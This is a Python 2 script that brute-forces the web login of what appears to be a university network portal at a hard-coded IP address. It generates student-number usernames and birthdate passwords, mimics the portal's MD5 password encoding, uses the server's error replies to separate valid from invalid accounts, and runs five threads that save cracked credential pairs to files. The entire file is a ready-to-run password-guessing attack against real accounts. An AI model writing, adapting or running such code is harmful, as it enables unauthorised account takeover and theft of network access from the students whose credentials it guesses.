# coding=utf8
import urllib
import urllib2
import cookielib
import time
import ConfigParser
import re
import os
from hashlib import md5
import threading

loginUrl = "http://202.112.136.131/cgi-bin/do_login"

def mdcode(content):
    for c in ('utf-8', 'gbk', 'gb2312'):
        try:
            return content.decode(c).encode('utf-8')
        except:
            pass
    return 'unknown'


def cryptoPass(password):
    m = md5()  # 获取一个MD5加密算法对象
    m.update(password)  # 指定要加密的字符串
    return m.hexdigest()[8:-8]  # 获取加密后的16进制字符串

def isAvaliableAccount(username,password):
    postData = {}
    postData['username'] = username
    postData['password' ] = cryptoPass(password)
    postData['drop' ] = 0
    postData['type' ] = 1
    postData['n' ] = 100

    postData = urllib.urlencode(postData)
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0',
               'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}

    req = urllib2.Request(
        url=loginUrl,
        data=postData,
        headers=headers
    )
    try:
        text = mdcode(urllib2.urlopen(req).read())
        
        #密码错误 
        err = 2
        if "password_error" == text:
            return (err,"密码错误")
        
        # 用户名错误  
        err = 1
        if  "username_error" == text:
            return (err,"用户名错误")
        elif "status_error"== text:
            return (err,"用户已欠费，请尽快充值。")
        elif "available_error"== text:
            return (err,"用户已禁用")


            
        #正常账号 
        err=0
        p = re.findall('(^[\d]+$)', text, re.DOTALL)
        if len(p) >0 :
            print p[0]
            return (err,"")
        if "non_auth_error"== text:
            return (err,"您无须认证，可直接上网")
        if "ip_exist_error"== text:
            return (err,"您的IP尚未下线，请等待2分钟再试。")
        if "online_num_error"== text:
            return (err,"该帐号的登录人数已超过限额,如果怀疑帐号被盗用，请联系管理员。")
        if "flux_error"== text:
            return (err,"您的流量已超支")
        if "minutes_error"== text:
            return (err,"您的时长已超支")
        
        #系统有错误 
        err = 3
        if "user_tab_error" == text:
            return (err,"认证程序未启动")
        elif "usernum_error"== text:
            return (err,"用户数已达上限")
        elif "mode_error"== text:
            return (err,"系统已禁止WEB方式登录，请使用客户端")
        elif "time_policy_error"== text:
            return (err,"当前时段不允许连接")
        elif "ip_error" == text:
            return (err,"您的IP地址不合法")
        elif "mac_error" == text:
            return (err,"您的MAC地址不合法")
        elif "sync_error" == text:
            return (err,"您的资料已修改，正在等待同步，请2分钟后再试。")
        else:
            return (err,"找不到认证服务器")
    except:
        err = 4
        return (err,"程序异常")                           
    
def genAllAccounts(degree):
#    allUsers = ["38211519","39211224"]
#    allPass = ["19900823"]
    allUsers = []
    allPass = []

    for xi in range(degree,degree+1):
        for major in range(1,2):
            for cls in range(1,6):
                for no in range(1,30):
                    username = "12%02d%1d%1d%02d" % (xi,major,cls,no)
                    allUsers.append(username)
                    
    for year in range(1993,1996):
        for mon in range(1,13):
            for date in range(1,31):
                    password = "%04d%02d%02d" % (year,mon,date)
                    allPass.append(password)
    return (allUsers,allPass)


def worker(tid):
    tid +=6
    (allUsers,allPass) = genAllAccounts(tid)
#    allUsers = ["zy1221110","39211224","zy1221124"]
#    allPass = ["19910513","19900823","19891019"]
    """
    err = 0 正常账号
    err = 1 账号错误
    err = 2 密码错误
    err = 3 系统错误
    err = 4 异常
    """
    err = 0
    msg = ""
    f = open('crack%d.txt'%(tid), 'w')
    fLog = open('log%d.txt'%(tid), 'w')
    for username in allUsers:
        print username+"\n"
        for password in allPass:
            (err,msg) = isAvaliableAccount(username, password)
            if err == 0:
                fLog.write('%s\t%s\t%d\t%s\n'%(username,password,err,msg))
                f.write('%s\t%s\t%s\n'%(username,password,msg))
                f.flush()
                print '%s\t%s\t%d\t%s'%(username,password,err,msg)
                break
            elif err == 1:
                fLog.write('%s\t%s\t%d\t%s\n'%(username,password,err,msg))
                break
            elif err == 2:
                fLog.write('%s\t%s\t%d\t%s\n'%(username,password,err,msg))
                continue
            elif err == 3:
                fLog.write('%s\t%s\t%d\t%s\n'%(username,password,err,msg))
                print "系统错误"
            elif err == 4:
                fLog.write('%s\t%s\t%d\t%s\n'%(username,password,err,msg))
                print msg
    f.close()
    fLog.close()
    print "thread %d exit"%(tid)
    
def main():
    threadsNum = 5
    thread_pool = [] 
    for i in range(threadsNum): 
        th = threading.Thread(target=worker,args=(i,) ) 
        thread_pool.append(th) 
         
    # start threads one by one         
    for i in range(threadsNum): 
        thread_pool[i].start() 
     
    #collect all threads 
    for i in range(threadsNum): 
        threading.Thread.join(thread_pool[i]) 

    
    
        
if __name__ == '__main__':
    try:
        main()
        raw_input("Enter any key to exit:")
    except KeyboardInterrupt:
        pass
